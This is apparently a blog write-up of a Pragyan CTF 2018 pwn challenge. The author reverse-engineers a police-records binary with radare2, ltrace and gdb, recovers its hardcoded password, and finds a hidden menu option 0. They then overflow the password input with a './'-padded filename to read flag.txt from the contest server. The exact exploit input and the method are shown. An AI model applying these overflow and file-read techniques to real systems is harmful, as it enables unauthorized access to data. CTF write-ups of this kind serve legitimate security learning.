---
layout: post
title: "oldschool hack"
---
# oldschool hack - pragyan ctf 2018 

Chris is trying out to be a police officer and the applications have just been sent into the police academy. He is really eager to find out about his competition. Help it him back the system and view the other applicant’s applications.

The service is running at 128.199.224.175:13000

file: [police_academy](https://ctf.pragyan.org/download?file_key=a2b563db3189be871e766812c10b3907bc42ab40a6fe49eb194278b357aee3ac&team_key=65e49776c6b7eee723783313dd4fbfeebe8524d4892b16f277bf0627a23d3472)

(Pwn, 200 points)

i began this problem by running checksec and listing the functions in radare2:

```
'/home/vagrant/pragynanctf/pwn200/policeacademy'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

0x004006c0    2 16   -> 32   sym.imp.strncmp
0x004006d0    2 16   -> 48   sym.imp.puts
0x004006e0    2 16   -> 48   sym.imp.fread
0x004006f0    2 16   -> 48   sym.imp.fclose
0x00400700    2 16   -> 48   sym.imp.strlen
0x00400710    2 16   -> 48   sym.imp.__stack_chk_fail
0x00400720    2 16   -> 48   sym.imp.printf
0x00400730    2 16   -> 48   sym.imp.__libc_start_main
0x00400740    2 16   -> 48   sym.imp.fflush
0x00400750    2 16   -> 48   sym.imp.fopen
0x00400760    2 16   -> 48   sym.imp.__isoc99_scanf
0x00400770    2 16   -> 48   sym.imp.exit
0x00400780    1 16           sub.__gmon_start___248_780
0x00400790    1 41           entry0
0x004007c0    4 50   -> 41   sym.deregister_tm_clones
0x00400800    3 53           sym.register_tm_clones
0x00400840    3 28           sym.__do_global_dtors_aux
0x00400860    4 38   -> 35   sym.frame_dummy
0x00400886    8 277          sym.print_record
0x0040099b    4 312          sym.main
0x00400d10    4 101          sym.__libc_csu_init
0x00400d80    1 2            sym.__libc_csu_fini
0x00400d84    1 9            sym._fini
[0x00400790]>
```

notice that stack canaries are enabled and the only functions the binary appears to define are `main` and `print_record`.

upon running the binary for the first time we notice that it expects a password:

```
$ nc 128.199.224.175 13000    
Enter password to authentic yourself : fizbaz
Incorrect password. Closing connection.
```

i recovered the password by running the binary under ltrace, we can see it in the call to strncmp:

```
$ ltrace -s 70 ./policeacademy    
__libc_start_main(0x40099b, 1, 0x7ffcdffd2048, 0x400d10 <unfinished ...>
printf("Enter password to authentic yourself : ")                                   = 39
fflush(0x7f7f5a850620Enter password to authentic yourself : )                                                              = 0
__isoc99_scanf(0x400e41, 0x7ffcdffd1f20, 0, 0x7f7f5a582290fizbaz
)                         = 1
strncmp("fizbaz", "kaiokenx20", 10)                                                 = -5
puts("Incorrect password. Closing connection."Incorrect password. Closing connection.
)                                     = 40
exit(0 <no return ...>
+++ exited (status 0) +++
```

one thing in particular which caught my interest here is that we're using strncmp and its given a length of 10, but our password may be much longer, which means we can enter "kaiokenx20" followed by a long string of characters and the check will still pass! long enough even that we can overwrite the saved return address but the stack cookies catch us before returning to our overwritten addres:

```
$ ./policeacademy 
Enter password to authentic yourself : kaiokenx20AAAAAAAAA<a lot of As>...
Enter case number: 

         1) Application_1
         2) Application_2
         3) Application_3
         4) Application_4
         5) Application_5
         6) Application_6
         7) Flag

         Enter choice :- 1

No such record exists. Please verify your choice.

*** stack smashing detected ***: ./policeacademy terminated
[1]    5861 abort      ./policeacademy
```

this was important to keep in mind although it was not enough to solve the challenge just yet.

after entering the correct password we find that we may not view any of the police records locally but we can remotely. i ran ltrace to see why (the -s option allows strings to be longer than the default 32 characters.)

```
$ ltrace -s 70 ./policeacademy    
__libc_start_main(0x40099b, 1, 0x7ffdebb58f38, 0x400d10 <unfinished ...>
printf("Enter password to authentic yourself : ")                                   = 39
fflush(0x7f1de6bc2620Enter password to authentic yourself : )                                                              = 0
__isoc99_scanf(0x400e41, 0x7ffdebb58e10, 0, 0x7f1de68f4290kaiokenx20
)                         = 1
strncmp("kaiokenx20", "kaiokenx20", 10)                                             = 0
puts("Enter case number: "Enter case number: 
)                                                         = 20
printf("\n\t 1) Application_1"
)                                                     = 19
printf("\n\t 2) Application_2"   1) Application_1
)                                                     = 19
printf("\n\t 3) Application_3"   2) Application_2
)                                                     = 19
printf("\n\t 4) Application_4"   3) Application_3
)                                                     = 19
printf("\n\t 5) Application_5"   4) Application_4
)                                                     = 19
printf("\n\t 6) Application_6"   5) Application_5
)                                                     = 19
printf("\n\t 7) Flag"    6) Application_6
)                                                              = 10
printf("\n\n\t Enter choice :- "         7) Flag

)                                                   = 20
fflush(0x7f1de6bc2620    Enter choice :- )                                                              = 0
__isoc99_scanf(0x400fac, 0x7ffdebb58e08, 0, 0x7f1de68f42901
)                         = 1
strlen("2a5880700ae8e5f51ca9df9c5a44356d.dat")                                      = 36
fopen("2a5880700ae8e5f51ca9df9c5a44356d.dat", "r")                                  = 0
printf("\nNo such record exists. Please verify your choice."
)                       = 50
fflush(0x7f1de6bc2620No such record exists. Please verify your choice.)                                                              = 0
puts("\n"

)                                                                          = 2
+++ exited (status 0) +++
```

notice the call to fopen where the binary is attempting to open a file locally which does not exist! in addition we may are told that we do not have sufficient permissions when attempting to use the flag option. when taking a closer look at what the options do internally we notice something very suspicious:

```
0x00400a14      bf000f4000     mov edi, str.Enter_case_number:
0x00400a19      e8b2fcffff     call sym.imp.puts
0x00400a1e      bf140f4000     mov edi, str._n_t_1__Application_1
0x00400a23      b800000000     mov eax, 0
0x00400a28      e8f3fcffff     call sym.imp.printf
0x00400a2d      bf280f4000     mov edi, str._n_t_2__Application_2
0x00400a32      b800000000     mov eax, 0
0x00400a37      e8e4fcffff     call sym.imp.printf
0x00400a3c      bf3c0f4000     mov edi, str._n_t_3__Application_3
0x00400a41      b800000000     mov eax, 0
0x00400a46      e8d5fcffff     call sym.imp.printf
0x00400a4b      bf500f4000     mov edi, str._n_t_4__Application_4
0x00400a50      b800000000     mov eax, 0
0x00400a55      e8c6fcffff     call sym.imp.printf
0x00400a5a      bf640f4000     mov edi, str._n_t_5__Application_5
0x00400a5f      b800000000     mov eax, 0
0x00400a64      e8b7fcffff     call sym.imp.printf
0x00400a69      bf780f4000     mov edi, str._n_t_6__Application_6
0x00400a6e      b800000000     mov eax, 0
0x00400a73      e8a8fcffff     call sym.imp.printf
0x00400a78      bf8c0f4000     mov edi, str._n_t_7__Flag
0x00400a7d      b800000000     mov eax, 0
0x00400a82      e899fcffff     call sym.imp.printf
0x00400a87      bf970f4000     mov edi, str._n_n_t_Enter_choice_:_
0x00400a8c      b800000000     mov eax, 0
0x00400a91      e88afcffff     call sym.imp.printf
0x00400a96      488b05eb1520.  mov rax, qword obj.stdout
0x00400a9d      4889c7         mov rdi, rax
0x00400aa0      e89bfcffff     call sym.imp.fflush
0x00400aa5      488d45b8       lea rax, [local_48h]
0x00400aa9      4889c6         mov rsi, rax
0x00400aac      bfac0f4000     mov edi, 0x400fac
0x00400ab1      b800000000     mov eax, 0
0x00400ab6      e8a5fcffff     call sym.imp.__isoc99_scanf
0x00400abb      8b45b8         mov eax, dword [local_48h]
0x00400abe      83f807         cmp eax, 7
0x00400ac1      0f87f1010000   ja 0x400cb8
0x00400ac7      89c0           mov eax, eax
0x00400ac9      488b04c52810.  mov rax, qword [rax*8 + 0x401028]
0x00400ad1      ffe0           jmp rax
```

notice our option getting read in with scanf and then our number being used in the pointer arithmetic at `0x400ac9` after which the final pointer is jumped to! whats at this address `0x401028` you might ask?! i consulted gdb:

```
0x0401028│+0x00: 0x0400cb8  →  0x400cb8  <main+797>  lea rax, [rbp-0x30]
0x0401030│+0x08: 0x0400ad3  →  0x400ad3  <main+312>  lea rax, [rbp-0x30]
0x0401038│+0x10: 0x0400b1e  →  0x400b1e  <main+387>  lea rax, [rbp-0x30]
0x0401040│+0x18: 0x0400b69  →  0x400b69  <main+462>  lea rax, [rbp-0x30]
0x0401048│+0x20: 0x0400bb4  →  0x400bb4  <main+537>  lea rax, [rbp-0x30]
0x0401050│+0x28: 0x0400bff  →  0x400bff  <main+612>  lea rax, [rbp-0x30]
0x0401058│+0x30: 0x0400c47  →  0x400c47  <main+684>  lea rax, [rbp-0x30]
0x0401060│+0x38: 0x0400c8f  →  0x400c8f  <main+756>  lea rax, [rbp-0x30]
```

a series of pointers! notice our offsets though... so if we enter 1; `1*8 = 8`, `8+0x401028 = 0x401030`.. what happens if we enter 0? our resulting rax is `0x401028`!! so there's a 0th option which isn't on the menu!!

let's  see whats at the destinations of these pointers:

```
[0x00400bb8]> pd 100@0x0400ad3
         0x00400ad3      488d45d0       lea rax, [rbp - 0x30]
         0x00400ad7      48b932613538.  movabs rcx, 0x3037303838356132
         0x00400ae1      488908         mov qword [rax], rcx
         0x00400ae4      48ba30616538.  movabs rdx, 0x3566356538656130
         0x00400aee      48895008       mov qword [rax + 8], rdx
         0x00400af2      48b931636139.  movabs rcx, 0x6339666439616331
         0x00400afc      48894810       mov qword [rax + 0x10], rcx
         0x00400b00      48ba35613434.  movabs rdx, 0x6436353334346135
         0x00400b0a      48895018       mov qword [rax + 0x18], rdx
         0x00400b0e      c740202e6461.  mov dword [rax + 0x20], 0x7461642e
         0x00400b15      c6402400       mov byte [rax + 0x24], 0
     ┌─< 0x00400b19      e99a010000     jmp 0x400cb8
     │   0x00400b1e      488d45d0       lea rax, [rbp - 0x30]
     │   0x00400b22      48be63383561.  movabs rsi, 0x6331656461353863
     │   0x00400b2c      488930         mov qword [rax], rsi
     │   0x00400b2f      48b934376263.  movabs rcx, 0x3265626263623734
     │   0x00400b39      48894808       mov qword [rax + 8], rcx
     │   0x00400b3d      48ba61633634.  movabs rdx, 0x3934313234366361
     │   0x00400b47      48895010       mov qword [rax + 0x10], rdx
     │   0x00400b4b      48be31393439.  movabs rsi, 0x3831623139343931
     │   0x00400b55      48897018       mov qword [rax + 0x18], rsi
     │   0x00400b59      c740202e6461.  mov dword [rax + 0x20], 0x7461642e
     │   0x00400b60      c6402400       mov byte [rax + 0x24], 0
    ┌──< 0x00400b64      e94f010000     jmp 0x400cb8
    ││   0x00400b69      488d45d0       lea rax, [rbp - 0x30]
    ││   0x00400b6d      48b938323963.  movabs rcx, 0x3233613163393238
    ││   0x00400b77      488908         mov qword [rax], rcx
    ││   0x00400b7a      48ba36323233.  movabs rdx, 0x3362666133323236
    ││   0x00400b84      48895008       mov qword [rax + 8], rdx
    ││   0x00400b88      48be33633334.  movabs rsi, 0x6236316334336333
    ││   0x00400b92      48897010       mov qword [rax + 0x10], rsi
    ││   0x00400b96      48b962613437.  movabs rcx, 0x6432373437346162
    ││   0x00400ba0      48894818       mov qword [rax + 0x18], rcx
    ││   0x00400ba4      c740202e6461.  mov dword [rax + 0x20], 0x7461642e
    ││   0x00400bab      c6402400       mov byte [rax + 0x24], 0
   ┌───< 0x00400baf      e904010000     jmp 0x400cb8
   │││   0x00400bb4      488d45d0       lea rax, [rbp - 0x30]
   │││   0x00400bb8      48ba61353464.  movabs rdx, 0x6438326664343561
   │││   0x00400bc2      488910         mov qword [rax], rdx
   │││   0x00400bc5      48be62386234.  movabs rsi, 0x6630386434623862
   │││   0x00400bcf      48897008       mov qword [rax + 8], rsi
   │││   0x00400bd3      48b937303636.  movabs rcx, 0x6164313136363037
   │││   0x00400bdd      48894810       mov qword [rax + 0x10], rcx
   │││   0x00400be1      48ba39393831.  movabs rdx, 0x3036343931383939
   │││   0x00400beb      48895018       mov qword [rax + 0x18], rdx
   │││   0x00400bef      c740202e6461.  mov dword [rax + 0x20], 0x7461642e
   │││   0x00400bf6      c6402400       mov byte [rax + 0x24], 0
  ┌────< 0x00400bfa      e9b9000000     jmp 0x400cb8
  ││││   0x00400bff      488d45d0       lea rax, [rbp - 0x30]
  ││││   0x00400c03      48be34353362.  movabs rsi, 0x6362376562333534
  ││││   0x00400c0d      488930         mov qword [rax], rsi
  ││││   0x00400c10      48b930663233.  movabs rcx, 0x6330396433326630
  ││││   0x00400c1a      48894808       mov qword [rax + 8], rcx
  ││││   0x00400c1e      48ba30653333.  movabs rdx, 0x6235646333336530
  ││││   0x00400c28      48895010       mov qword [rax + 0x10], rdx
  ││││   0x00400c2c      48be35313033.  movabs rsi, 0x3063323833303135
  ││││   0x00400c36      48897018       mov qword [rax + 0x18], rsi
  ││││   0x00400c3a      c740202e6461.  mov dword [rax + 0x20], 0x7461642e
  ││││   0x00400c41      c6402400       mov byte [rax + 0x24], 0
 ┌─────< 0x00400c45      eb71           jmp 0x400cb8
 │││││   0x00400c47      488d45d0       lea rax, [rbp - 0x30]
 │││││   0x00400c4b      48b933313333.  movabs rcx, 0x3663666533333133
 │││││   0x00400c55      488908         mov qword [rax], rcx
 │││││   0x00400c58      48ba39326137.  movabs rdx, 0x6235643537613239
 │││││   0x00400c62      48895008       mov qword [rax + 8], rdx
 │││││   0x00400c66      48be64353661.  movabs rsi, 0x6137653661363564
 │││││   0x00400c70      48897010       mov qword [rax + 0x10], rsi
 │││││   0x00400c74      48b966373236.  movabs rcx, 0x6337323136323766
 │││││   0x00400c7e      48894818       mov qword [rax + 0x18], rcx
 │││││   0x00400c82      c740202e6461.  mov dword [rax + 0x20], 0x7461642e
 │││││   0x00400c89      c6402400       mov byte [rax + 0x24], 0
┌──────< 0x00400c8d      eb29           jmp 0x400cb8
││││││   0x00400c8f      488d45d0       lea rax, [rbp - 0x30]
││││││   0x00400c93      48ba666c6167.  movabs rdx, 0x7478742e67616c66
││││││   0x00400c9d      488910         mov qword [rax], rdx
││││││   0x00400ca0      c6400800       mov byte [rax + 8], 0
││││││   0x00400ca4      bfb00f4000     mov edi, str.You_don_t_have_th...
││││││   0x00400ca9      e822faffff     call sym.imp.puts
││││││   0x00400cae      bf00000000     mov edi, 0
││││││   0x00400cb3      e8b8faffff     call sym.imp.exit
└└└└└└─> 0x00400cb8      488d45d0       lea rax, [rbp - 0x30]
         0x00400cbc      4889c7         mov rdi, rax
         0x00400cbf      e8c2fbffff     call sym.print_record
```

so the filenames are loaded into the stack offset `$rbp - 0x30` and we jump to the call to print record where that stack offset is first loaded into the first argument.

hmmmm... i noticed that our secret 0th option took us right to the end where print_record is called.. and the filename is pulled right off the stack! i wonder whether we have control over this offset; i checked in gdb:

```
0x0000000000400cbc in main ()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────
$rax   : 0x00007fffffffe370  →  0x0000000067616c66 ("flag"?)
$rbx   : 0x0000000000000000
$rcx   : 0x0000000000000010
$rdx   : 0x00007ffff7dd3790  →  0x00
$rsp   : 0x00007fffffffe350  →  0x00
$rbp   : 0x00007fffffffe3a0  →  0x0000000000400d10  →  0x400d10  <__libc_csu_init+0>  push r15
$rsi   : 0x0000000000000001
$rdi   : 0x00007fffffffde30  →  0x0000000000190030 ("0"?)
$rip   : 0x0000000000400cbc  →  0x400cbc  <main+801>  mov rdi, rax
$r8    : 0x0000000000000000
$r9    : 0x0000000000000000
$r10   : 0x0000000000000000
$r11   : 0x00007ffff7b845a0  →  0x02000200020002
$r12   : 0x0000000000400790  →  0x400790  <_start+0>  xor ebp, ebp
$r13   : 0x00007fffffffe480  →  0x01
$r14   : 0x0000000000000000
$r15   : 0x0000000000000000
$eflags: [CARRY PARITY ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
0x00007fffffffe350│+0x00: 0x00   ← $rsp
0x00007fffffffe358│+0x08: 0x00
0x00007fffffffe360│+0x10: "kaiokenx20XXXXXXflag"
0x00007fffffffe368│+0x18: "20XXXXXXflag"
---Type <return> to continue, or q <return> to quit---
0x00007fffffffe370│+0x20: 0x0000000067616c66 ("flag"?)   ← $rax
0x00007fffffffe378│+0x28: 0x00
0x00007fffffffe380│+0x30: 0x0000000000400d10  →  0x400d10  <__libc_csu_init+0>  push r15
0x00007fffffffe388│+0x38: 0x0000000000400790  →  0x400790  <_start+0>  xor ebp, ebp
───────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386:x86-64 ]────
   0x400ca3  <main+776>  add BYTE PTR [rdi+0x400fb0], bh
   0x400ca9  <main+782>  call 0x4006d0 <puts@plt>
   0x400cae  <main+787>  mov edi, 0x0
   0x400cb3  <main+792>  call 0x400770 <exit@plt>
   0x400cb8  <main+797>  lea rax, [rbp-0x30]
 → 0x400cbc  <main+801>  mov rdi, rax
   0x400cbf  <main+804>  call 0x400886 <print_record>
   0x400cc4  <main+809>  mov DWORD PTR [rbp-0x44], eax
   0x400cc7  <main+812>  cmp DWORD PTR [rbp-0x44], 0xffffffff
   0x400ccb  <main+816>  jne 0x400cdc <main+833>
   0x400ccd  <main+818>  mov edi, 0x400ff0
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

we just have to provide a few character offset between our password and the filename and its passed as an argument to print record! here's where the challenging part actually begins! lets try providing this string as a password and using our 0th option while running the binary under ltrace to see a more succinct view of what happens;

```
$ ltrace -s 70 ./policeacademy         
__libc_start_main(0x40099b, 1, 0x7ffe511b2ba8, 0x400d10 <unfinished ...>
printf("Enter password to authentic yourself : ")                                                                     = 39
fflush(0x7f001abcc620Enter password to authentic yourself : )                                                                                                = 0
__isoc99_scanf(0x400e41, 0x7ffe511b2a80, 0, 0x7f001a8fe290kaiokenx20XXXXXXflag
)                                                           = 1
strncmp("kaiokenx20XXXXXXflag", "kaiokenx20", 10)                                                                     = 0
puts("Enter case number: "Enter case number: 
)                                                                                           = 20
printf("\n\t 1) Application_1"
)                                                                                       = 19
printf("\n\t 2) Application_2"   1) Application_1
)                                                                                       = 19
printf("\n\t 3) Application_3"   2) Application_2
)                                                                                       = 19
printf("\n\t 4) Application_4"   3) Application_3
)                                                                                       = 19
printf("\n\t 5) Application_5"   4) Application_4
)                                                                                       = 19
printf("\n\t 6) Application_6"   5) Application_5
)                                                                                       = 19
printf("\n\t 7) Flag"    6) Application_6
)                                                                                                = 10
printf("\n\n\t Enter choice :- "         7) Flag

)                                                                                     = 20
fflush(0x7f001abcc620    Enter choice :- )                                                                                                = 0
__isoc99_scanf(0x400fac, 0x7ffe511b2a78, 0, 0x7f001a8fe2900
)                                                           = 1
strlen("flag")                                                                                                        = 4
printf("\nNo such record exists. Please verify your choice."
)                                                         = 50
fflush(0x7f001abcc620No such record exists. Please verify your choice.)                                                                                                = 0
puts("\n"

)                                                                                                            = 2
+++ exited (status 0) +++
```

so it checks the length of our filename and immediately returns that no such record exists without even trying to open the file! what gives?! i checked radare2 disassembly for `print_record` to find out:

```
┌ (fcn) sym.print_record 277
│   sym.print_record ();
│           ; var int local_348h @ rbp-0x348
│           ; var int local_33ch @ rbp-0x33c
│           ; var int local_338h @ rbp-0x338
│           ; var int local_330h @ rbp-0x330
│           ; var int local_8h @ rbp-0x8
│           0x00400886      55             push rbp
│           0x00400887      4889e5         mov rbp, rsp
│           0x0040088a      4881ec500300.  sub rsp, 0x350
│           0x00400891      4889bdb8fcff.  mov qword [local_348h], rdi
│           0x00400898      64488b042528.  mov rax, qword fs:[0x28]
│           0x004008a1      488945f8       mov qword [local_8h], rax
│           0x004008a5      31c0           xor eax, eax
│           0x004008a7      488b85b8fcff.  mov rax, qword [local_348h]
│           0x004008ae      4889c7         mov rdi, rax
│           0x004008b1      e84afeffff     call sym.imp.strlen
│           0x004008b6      8985c4fcffff   mov dword [local_33ch], eax
│           0x004008bc      83bdc4fcffff.  cmp dword [local_33ch], 0x24
│       ┌─< 0x004008c3      740a           je 0x4008cf
│       │   0x004008c5      b8ffffffff     mov eax, 0xffffffff
│      ┌──< 0x004008ca      e9b6000000     jmp 0x400985
│      │└─> 0x004008cf      488b85b8fcff.  mov rax, qword [local_348h]
│      │    0x004008d6      be980d4000     mov esi, 0x400d98
│      │    0x004008db      4889c7         mov rdi, rax
│      │    0x004008de      e86dfeffff     call sym.imp.fopen
```

so it checks the length of our string for `0x24` and if it isn't equal it loads -1 into its return value and returns immediately. ok so this is fine and dandy i wonder if the flag filename is `0x24` characters long.. for that matter how the heck do i even know what the flag filename is?! thank goodness radare2 has a nice hex editor view where we can see the filenames it loads before calling `print_record` in the disassembly;

```
[0x00400bb8 22% 784 policeacademy]> xc  
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x00400bb8  48ba 6135 3464 6632 3864 4889 1048 be62  H.a54df28dH..H.b
0x00400bc8  3862 3464 3830 6648 8970 0848 b937 3036  8b4d80fH.p.H.706
0x00400bd8  3631 3164 6148 8948 1048 ba39 3938 3139  611daH.H.H.99819
0x00400be8  3436 3048 8950 18c7 4020 2e64 6174 c640  460H.P..@ .dat.@
0x00400bf8  2400 e9b9 0000 0048 8d45 d048 be34 3533  $......H.E.H.453
0x00400c08  6265 3762 6348 8930 48b9 3066 3233 6439  be7bcH.0H.0f23d9
0x00400c18  3063 4889 4808 48ba 3065 3333 6364 3562  0cH.H.H.0e33cd5b
0x00400c28  4889 5010 48be 3531 3033 3832 6330 4889  H.P.H.510382c0H.
0x00400c38  7018 c740 202e 6461 74c6 4024 00eb 7148  p..@ .dat.@$..qH
0x00400c48  8d45 d048 b933 3133 3365 6663 3648 8908  .E.H.3133efc6H..
0x00400c58  48ba 3932 6137 3564 3562 4889 5008 48be  H.92a75d5bH.P.H.
0x00400c68  6435 3661 3665 3761 4889 7010 48b9 6637  d56a6e7aH.p.H.f7
0x00400c78  3236 3132 3763 4889 4818 c740 202e 6461  26127cH.H..@ .da
0x00400c88  74c6 4024 00eb 2948 8d45 d048 ba66 6c61  t.@$..)H.E.H.fla
0x00400c98  672e 7478 7448 8910 c640 0800 bfb0 0f40  g.txtH...@.....@
```

so we see there our dat files and then lookie there in the final two lines!! flag.txt... that must be our flag filename.. but how do we make our flag filename `0x24` characters long?!

this was where some of my experience in the past with web path traversal attacks came in handy.. i knew that you could precede any filename with a series of '/'s and if it the file happened to be in the root of the filesystem it would work, that was not the case with this challenge, i tried this and it said the record was not found. so i assumed it must be in the current working directory just as the rest of the records were. that's when it hit me! we can simply precede our filename with a series of './'s and it would also work! assuming that the length of 'flag.txt' minus `0x24` was a number divisble by two! which it was:

```
>>> 0x24
36
>>> 36 - len('flag.txt')
28
>>> 28/2
14
>>> print './' * 14
././././././././././././././
>>> len('./' * 14) 
28
```

and my payload finally worked!

```
$ nc 128.199.224.175 13000 
Enter password to authentic yourself : kaiokenx20XXXXXX././././././././././././././flag.txt
Enter case number: 

         1) Application_1
         2) Application_2
         3) Application_3
         4) Application_4
         5) Application_5
         6) Application_6
         7) Flag

         Enter choice :- 0

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

The flag is :- pctf{bUff3r-0v3Rfl0wS`4r3.alw4ys-4_cl4SsiC}
�2

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```
